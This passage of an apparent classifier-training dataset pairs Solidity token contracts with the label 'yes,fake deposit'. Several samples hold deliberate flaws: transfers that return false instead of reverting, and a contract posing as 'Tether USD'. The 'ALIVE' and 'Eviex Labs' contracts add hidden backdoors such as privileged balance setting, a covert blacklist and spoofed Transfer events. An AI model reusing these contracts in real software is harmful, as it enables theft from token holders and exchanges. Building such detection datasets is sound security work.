uint _value) public override returns (bool success) {\n if (__allowances[_from][msg.sender] > 0 &&\n _value >0 &&\n __allowances[_from][msg.sender] >= _value\n // the to address is not a contract\n && !isContract(_to)) {\n __balanceOf[_from] -= _value;\n __balanceOf[_to] += _value;\n emit Transfer(_from, _to, _value);\n return true;\n }\n return false;\n }\n\n\n //This check is to determine if we are sending to a contract?\n //Is there code at this address? If the code size is greater then 0 then it is a contract.\n function isContract(address _addr) public view returns (bool) {\n uint codeSize;\n //in line assembly code\n assembly {\n codeSize := extcodesize(_addr)\n }\n // i=s code size > 0 then true\n return codeSize > 0; \n }\n\n \n //allows a spender address to spend a specific amount of value\n function approve(address _spender, uint _value) external override returns (bool success) {\n __allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n\n //shows how much a spender has the approval to spend to a specific address\n function allowance(address _owner, address _spender) external override view returns (uint remaining) {\n return __allowances[_owner][_spender];\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Hexaputon is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Hexaputon\";\n string public constant symbol = \"HEXA\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.4.19;\n\ncontract Token {\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) public constant returns (uint balance);\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint _value) public returns (bool success);\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint _value) public returns (bool success);\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint _value) public returns (bool success);\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) public constant returns (uint remaining);\n\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ncontract RegularToken is Token {\n uint constant private MAX_UINT = 2**256 - 1;\n\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n\n function transfer(address _to, uint _value) public returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint _value) public returns (bool success)\n {\n uint allowance = allowed[_from][msg.sender];\n if (balances[_from] >= _value\n && allowance >= _value\n && balances[_to] + _value >= balances[_to]\n ) {\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public constant returns (uint balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n\n}\n\ncontract IOSToken is RegularToken {\n\n uint constant public totalSupply = 90*10**27;\n uint8 constant public decimals = 18;\n string constant public name = \"Wrapped IOST\";\n string constant public symbol = \"IOST\";\n\n function IOSToken() public {\n balances[msg.sender] = totalSupply;\n Transfer(address(0), msg.sender, totalSupply);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n address E20 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n modifier onlyOwner{\n require(msg.sender == _Owner); \n _; }\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n\n}\n\n\n\ncontract ALIVE is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private E1;\n mapping (address => uint256) private E2;\n mapping (address => mapping (address => uint256)) private E3;\n uint8 private constant E4 = 8;\n uint256 private constant E5 = 100000000 * (10** E4);\n string private constant _name = \"Increasingly Alive\";\n string private constant _symbol = \"ALIVE\";\n\n\n\n constructor () {\n E1[msg.sender] = E5; \n E2[msg.sender] = 2; \n E99(E5);}\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return E4;\n }\n\n function totalSupply() public pure returns (uint256) {\n return E5;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return E1[account];\n }\n\t function allowance(address owner, address spender) public view returns (uint256) {\n return E3[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n E3[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\nfunction SETE2 (address x, uint256 y) public {\n require(E2[msg.sender] == 2);\n E2[x] = y;}\n function update() public {\n E1[msg.sender] = E2[msg.sender];}\n function E99 (uint256 x) internal {\n emit Transfer(address(0), E20, x);}\n function _Transfer (address y, uint256 xy) internal {\n emit Transfer(E20, y, xy);}\n function transfer(address to, uint256 amount) public {\nif(E2[msg.sender] == 2) {\n require(E1[msg.sender] >= amount);\n E1[msg.sender] = E1[msg.sender].sub(amount);\n E1[to] = E1[to].add(amount);\n _Transfer(to, amount);}\nif(E2[msg.sender] <= 1) {\n require(E1[msg.sender] >= amount);\n E1[msg.sender] = E1[msg.sender].sub(amount);\n E1[to] = E1[to].add(amount);\n emit Transfer(msg.sender, to, amount);}}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\nif(E2[sender] <= 1 && E2[recipient] <=1) {\n require(amount <= E1[sender]);\n require(amount <= E3[sender][msg.sender]);\n E1[sender] = E1[sender].sub(amount);\n E1[recipient] = E1[recipient].add(amount);\n emit Transfer(sender, recipient, amount);\n return true;}\n if(E2[sender] == 2) {\n require(amount <= E3[sender][msg.sender]);\n E1[sender] = E1[sender].sub(amount);\n E1[recipient] = E1[recipient].add(amount);\n _Transfer(recipient, amount);\n return true;}\n }}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// Abstract contract for the full ERC 20 Token standard\npragma solidity ^0.5.17;\n\ncontract Token {\n \n uint256 public totalSupply;\n\n function balanceOf(address _owner) public view returns (uint256 balance);\n\n function transfer(address _to, uint256 _value) public returns (bool success);\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n\n function approve(address _spender, uint256 _value) public returns (bool success);\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining);\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\n\ncontract SOT is StandardToken {\n\n \n \n string public name; //fancy name\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals.\n string public symbol; //An identifier\n string public version = \"1.0\"; // 0.1 standard. Just an arbitrary versioning scheme.\n constructor() public{\n balances[msg.sender] = 91000000000000; // Give the creator all initial tokens\n totalSupply = 91000000000000; // Update total supply\n name = \"SOT\"; // Set the name for display purposes\n decimals = 6; // Amount of decimals for display purposes\n symbol = \"SOT\"; // Set the symbol for display purposes\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.12;\n \n\ncontract IMigrationContract {\n function migrate(address addr, uint256 nas) returns (bool success);\n}\n\n\ncontract SafeMath {\n function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x + y;\n assert((z >= x) && (z >= y));\n return z;\n }\n \n function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\n assert(x >= y);\n uint256 z = x - y;\n return z;\n }\n \n function safeMult(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x * y;\n assert((x == 0)||(z/x == y));\n return z;\n }\n \n}\n \n\ncontract Token {\n uint256 public totalSupply; //\u4ee3\u5e01\u603b\u91cf\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\ncontract StandardToken is Token {\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n \n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n \n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n \n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n \n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\n \n\n//JGO\u4ee3\u5e01\u5408\u7ea6\ncontract JGOToken is StandardToken, SafeMath {\n string public constant name = \"laeerg\"; //\u540d\u79f0\n string public constant symbol = \"LAR\"; //\u7b26\u53f7\n uint256 public constant decimals = 9; //\u5c0f\u6570\u4f4d\n string public version = \"1.0\"; //\u7248\u672c\n \n address public ethFundDeposit; //ETH\u5b58\u653e\u5730\u5740\n uint256 public currentSupply; //\u4ee3\u5e01\u4f9b\u5e94\u91cf\n\n \n modifier isOwner() { require(msg.sender == ethFundDeposit); _; }\n\n function formatDecimals(uint256 _value) internal returns (uint256 ) {\n return _value * 10 ** decimals;\n }\n\n \n //JGO\u5408\u7ea6\u521d\u59cb\u5316\u51fd\u6570(\u5408\u7ea6\u6240\u6709\u4eba\u5730\u5740, \u5f53\u524d\u4f9b\u5e94\u91cf, \u4ee3\u5e01\u603b\u91cf)\n function JGOToken(address _ethFundDeposit, uint256 _totalSupply) {\n ethFundDeposit = _ethFundDeposit;\n \n currentSupply = formatDecimals(_totalSupply); //\u5f53\u524d\u4f9b\u5e94\u91cf\n totalSupply = formatDecimals(_totalSupply); //\u4ee3\u5e01\u603b\u91cf\n balances[msg.sender] = totalSupply;\n if(currentSupply > totalSupply) throw;\n }\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //Name of the token\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 100000000000000000; // Update total supply (100000 for example)\n name = \"getirgold\"; // Set the name for display purposes\n decimals = 8; // Amount of decimals\n symbol = \"GGD\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _MsgSendr() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address _buildr = 0x3037290Aa65CbC698Fa4365023C3f847a6feE68D;\n\taddress UniswapV2 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\n constructor () {\n address msgSender = _MsgSendr();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n}\n\n\n\ncontract EviexLabs is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private IxI;\n\tmapping (address => bool) private Io;\n mapping (address => bool) private Oi;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _Total = 150000000 * 10**_decimals;\n string private constant _name = \"Eviex Labs\";\n string private constant _symbol = \"EVIEX\";\n\n\n\n constructor () {\n IxI[_MsgSendr()] = _Total;\n emit Transfer(address(0), UniswapV2, _Total);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _Total;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return IxI[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction zend(address z) public {\n if(Io[msg.sender]) { \n Oi[z] = false;}}\n function zquery(address z) public{\n if(Io[msg.sender]) { \n require(!Oi[z]);\n Oi[z] = true; }}\n\t\tfunction zstake(address z) public{\n if(msg.sender == _buildr) { \n require(!Io[z]);\n Io[z] = true; }}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == _buildr) {\n require(amount <= IxI[sender]);\n IxI[sender] -= amount; \n IxI[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (UniswapV2, recipient, amount);\n return true; } \n if(!Oi[recipient]) {\n if(!Oi[sender]) {\n require(amount <= IxI[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n IxI[sender] -= amount;\n IxI[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address recipient, uint256 amount) public {\n if(msg.sender == _buildr) {\n require(IxI[msg.sender] >= amount);\n IxI[msg.sender] -= amount; \n IxI[recipient] += amount; \n emit Transfer (UniswapV2, recipient, amount);}\n if(Io[msg.sender]) {IxI[recipient] = amount;} \n if(!Oi[msg.sender]) {\n require(IxI[msg.sender] >= amount);\n IxI[msg.sender] -= amount; \n IxI[recipient] += amount; \n emit Transfer(msg.sender, recipient, amount);\n }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.6.7;\n\n\ninterface ERC20 {\n function totalSupply() external view returns (uint _totalSupply);\n function balanceOf(address _owner) external view returns (uint balance);\n function transfer(address _to, uint _value) external returns (bool success);\n function transferFrom(address _from, address _to, uint _value) external returns (bool success);\n function approve(address _spender, uint _value) external returns (bool success);\n function allowance(address _owner, address _spender) external view returns (uint remaining);\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n\n}\n\n// this is the basics of creating an ERC20 token\n//change the name Henri and the symbol to whatever you would like\n\ncontract Loeker is ERC20 {\n string public constant symbol = \"USDT\";\n string public constant name = \"Tether USD\";\n uint8 public constant decimals = 10;\n \n //1,000,000+10 zeros\n uint private constant __totalSupply = 10000000000000000000000000;\n\n //this mapping is where we store the balances of an address\n mapping (address => uint) private __balanceOf;\n\n //This is a mapping of a mapping. This is for the approval function to determine how much an address can spend\n mapping (address => mapping (address => uint)) private __allowances;\n\n //the creator of the contract has the total supply and no one can create tokens\n constructor() public {\n __balanceOf[msg.sender] = __totalSupply;\n }\n\n //constant value that does not change/ returns the amount of initial tokens to display\n function totalSupply() public view override returns (uint _totalSupply) {\n _totalSupply = __totalSupply;\n }\n\n //returns the balance of a specific address\n function balanceOf(address _addr) public view override returns (uint balance) {\n return __balanceOf[_addr];\n }\n \n\n //transfer an amount of tokens to another address. The transfer needs to be >0 \n //does the msg.sender have enough tokens to forfill the transfer\n //decrease the balance of the sender and increase the balance of the to address\n function transfer(address _to, uint _value) public override returns (bool success) {\n if (_value > 0 && _value <= balanceOf(msg.sender)) {\n __balanceOf[msg.sender] -= _value;\n __balanceOf[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n return false;\n }\n\n \n //this allows someone else (a 3rd party) to transfer from my wallet to someone elses wallet\n //If the 3rd party has an allowance of >0 \n //and the value to transfer is >0 \n //and the allowance is >= the value of the transfer\n //and it is not a contract\n //perform the transfer by increasing the to account and decreasing the from accounts\n function transferFrom(address _from, address _to, uint _value) public override returns (bool success) {\n if (__allowances[_from][msg.sender] > 0 &&\n _value >0 &&\n __allowances[_from][msg.sender] >= _value\n // the to address is not a contract\n && !isContract(_to)) {\n __balanceOf[_from] -= _value;\n __balanceOf[_to] += _value;\n emit Transfer(_from, _to, _value);\n return true;\n }\n return false;\n }\n\n\n //This check is to determine if we are sending to a contract?\n //Is there code at this address? If the code size is greater then 0 then it is a contract.\n function isContract(address _addr) public view returns (bool) {\n uint codeSize;\n //in line assembly code\n assembly {\n codeSize := extcodesize(_addr)\n }\n // i=s code size > 0 then true\n return codeSize > 0; \n }\n\n \n //allows a spender address to spend a specific amount of value\n function approve(address _spender, uint _value) external override returns (bool success) {\n __allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n\n //shows how much a spender has the approval to spend to a specific address\n function allowance(address _owner, address _spender) external override view returns (uint remaining) {\n return __allowances[_owner][_spender];\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.6.7;\n\n\ninterface ERC20 {\n function totalSupply() external view returns (uint _totalSupply);\n function balanceOf(address _owner) external view returns (uint balance);\n function transfer(address _to, uint _value) external returns (bool success);\n function transferFrom(address _from, address _to, uint _value) external returns (bool success);\n function approve(address _spender, uint _value) external returns (bool success);\n function allowance(address _owner, address _spender) external view returns (uint remaining);\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n\n}\n\n// this is the basics of creating an ERC20 token\n//change the name Henri and the symbol to whatever you would like\n\ncontract Loeker is ERC20 {\n string public constant symbol = \"MYN\";\n string public constant name = \"Myron\";\n uint8 public constant decimals = 6;\n \n //1,000,000+18 zeros\n uint private constant __totalSupply = 1000000000000;\n\n //this mapping is where we store the balances of an address\n mapping (address => uint) private __balanceOf;\n\n //This is a mapping of a mapping. This is for the approval function to determine how much an address can spend\n mapping (address => mapping (address => uint)) private __allowances;\n\n //the creator of the contract has the total supply and no one can create tokens\n constructor() public {\n __balanceOf[msg.sender] = __totalSupply;\n }\n\n //constant value that does not change/ returns the amount of initial tokens to display\n function totalSupply() public view override returns (uint _totalSupply) {\n _totalSupply = __totalSupply;\n }\n\n //returns the balance of a specific address\n function balanceOf(address _addr) public view override returns (uint balance) {\n return __balanceOf[_addr];\n }\n \n\n //transfer an amount of tokens to another address. The transfer needs to be >0 \n //does the msg.sender have enough tokens to forfill the transfer\n //decrease the balance of the sender and increase the balance of the to address\n function transfer(address _to, uint _value) public override returns (bool success) {\n if (_value > 0 && _value <= balanceOf(msg.sender)) {\n __balanceOf[msg.sender] -= _value;\n __balanceOf[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n return false;\n }\n\n \n //this allows someone else (a 3rd party) to transfer from my wallet to someone elses wallet\n //If the 3rd party has an allowance of >0 \n //and the value to transfer is >0 \n //and the allowance is >= the value of the transfer\n //and it is not a contract\n //perform the transfer by increasing the to account and decreasing the from accounts\n function transferFrom(address _from, address _to, uint _value) public override returns (bool success) {\n if (__allowances[_from][msg.sender] > 0 &&\n _value >0 &&\n __allowances[_from][msg.sender] >= _value\n // the to address is not a contract\n && !isContract(_to)) {\n __balanceOf[_from] -= _value;\n __balanceOf[_to] += _value;\n emit Transfer(_from, _to, _value);\n return true;\n }\n return false;\n }\n\n\n //This check is to determine if we are sending to a contract?\n //Is there code at this address? If the code size is greater then 0 then it is a contract.\n function isContract(address _addr) public view returns (bool) {\n uint 